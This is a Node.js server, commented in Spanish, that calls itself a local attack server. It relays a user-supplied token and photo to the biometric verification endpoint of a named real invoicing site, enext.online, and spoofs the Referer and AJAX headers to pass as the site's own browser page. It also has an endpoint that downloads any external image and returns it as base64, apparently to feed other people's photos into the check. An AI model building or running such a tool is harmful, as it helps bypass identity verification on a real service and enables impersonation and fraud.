const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = 3000;

const server = http.createServer((req, res) => {
  // 1. Servir los archivos estáticos de la interfaz
  if (req.method === 'GET' && !req.url.startsWith('/api/attack')) {
    let filePath = '.' + req.url;
    if (filePath === './') filePath = './index.html';

    const extname = String(path.extname(filePath)).toLowerCase();
    const mimeTypes = {
      '.html': 'text/html',
      '.js': 'text/javascript',
      '.css': 'text/css',
      '.json': 'application/json',
      '.png': 'image/png',
      '.jpg': 'image/jpg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml'
    };

    const contentType = mimeTypes[extname] || 'application/octet-stream';

    fs.readFile(filePath, (error, content) => {
      if (error) {
        if(error.code == 'ENOENT') {
          res.writeHead(404, { 'Content-Type': 'text/html' });
          res.end('404 No Encontrado', 'utf-8');
        } else {
          res.writeHead(500);
          res.end('Error del Servidor: '+error.code+' ..\n');
          res.end();
        }
      } else {
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(content, 'utf-8');
      }
    });
    return;
  }

  // 2. Endpoint API que recibe los datos de la interfaz y lanza el ataque
  if (req.method === 'POST' && req.url === '/api/attack') {
    let body = '';
    
    // Leer los datos enviados por la interfaz web
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const token = payload.token;
        const foto = payload.foto;

        if (!token || !foto) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Faltan datos' }));
        }

        // Empaquetar como formulario HTTP (igual que el navegador original)
        const postData = new URLSearchParams({ foto: foto, token: token }).toString();

        // Armar la petición hacia el servidor real (Disfraz)
        const attackReq = https.request({
          hostname: 'enext.online',
          path: '/factureroweb/admin/controller/emision/biometrico.php',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': 'https://enext.online/factureroweb/public/biometria.php',
            'X-Requested-With': 'XMLHttpRequest'
          }
        }, (attackRes) => {
          let attackData = '';
          attackRes.on('data', chunk => attackData += chunk);
          attackRes.on('end', () => {
            // Devolver el resultado a nuestra interfaz web
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              status: attackRes.statusCode,
              body: attackData
            }));
          });
        });

        attackReq.on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });

        attackReq.write(postData);
        attackReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Error procesando JSON' }));
      }
    });
    return;
  }

  // 3. Endpoint para descargar una imagen externa y retornarla en Base64 (evita CORS)
  if (req.method === 'POST' && req.url === '/api/download-image') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const imageUrl = payload.url;
        if (!imageUrl) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Falta URL' }));
        }

        https.get(imageUrl, (imageRes) => {
          if (imageRes.statusCode !== 200) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'Error descargando la imagen externa' }));
          }

          const chunks = [];
          imageRes.on('data', (chunk) => chunks.push(chunk));
          imageRes.on('end', () => {
            const buffer = Buffer.concat(chunks);
            const contentType = imageRes.headers['content-type'] || 'image/jpeg';
            const base64 = `data:${contentType};base64,${buffer.toString('base64')}`;

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ base64: base64 }));
          });
        }).on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON inválido' }));
      }
    });
    return;
  }

  // Ruta no encontrada
  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 SERVIDOR DE ATAQUE LOCAL INICIADO`);
  console.log(`👉 Abre tu navegador en: http://localhost:${PORT}`);
  console.log(`======================================================\n`);
});
